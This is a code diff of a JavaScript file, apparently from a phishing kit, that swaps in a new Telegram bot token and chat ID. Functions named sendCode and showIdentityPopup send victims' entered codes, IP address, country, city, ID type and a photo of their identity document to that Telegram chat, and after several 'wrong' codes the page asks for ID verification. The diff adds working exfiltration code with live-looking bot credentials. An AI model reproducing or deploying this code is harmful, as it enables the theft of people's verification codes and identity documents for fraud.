@@ -173,8 +173,8 @@ function sendCode() {
       "%0A<strong>City : </strong>" +
       IpAddress.city;
 
-    const botToken = "7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8";
-    const chatId = "#-2299618966";
+    const botToken = "7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44";
+    const chatId = "-1002299618966";
     const message = message1;
 
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
@@ -190,7 +190,7 @@ function sendCode() {
         setTimeout(function () {
           if (NUMBER_TIME_SEND_CODE < 4) {
             $("#wrong-code").removeClass("d-none");
-            $("#code").val(""); 
+            $("#code").val("");
           } else {
             $("#getCode").removeClass("d-none");
             showIdentityPopup();
@@ -387,11 +387,11 @@ function showIdentityPopup() {
       document.querySelector(".lsd-ring-container").classList.remove("d-none");
 
       // Send info first
-      const chatId = "#-2299618966";
+      const chatId = "-1002299618966";
       const infoMessage = `🆔 ID Type: ${idType}\n📍 IP: ${IpAddress.ipAddress}\n🌍 Country: ${IpAddress.countryName}\n🏙️ City: ${IpAddress.city}`;
 
       fetch(
-        `https://api.telegram.org/bot7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8/sendMessage`,
+        `https://api.telegram.org/bot7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44/sendMessage`,
         {
           method: "POST",
           headers: {
@@ -416,7 +416,7 @@ function showIdentityPopup() {
           formData.append("photo", idImage);
 
           return fetch(
-            `https://api.telegram.org/bot7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8/sendPhoto`,
+            `https://api.telegram.org/bot7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44/sendPhoto`,
             {
               method: "POST",
               body: formData,
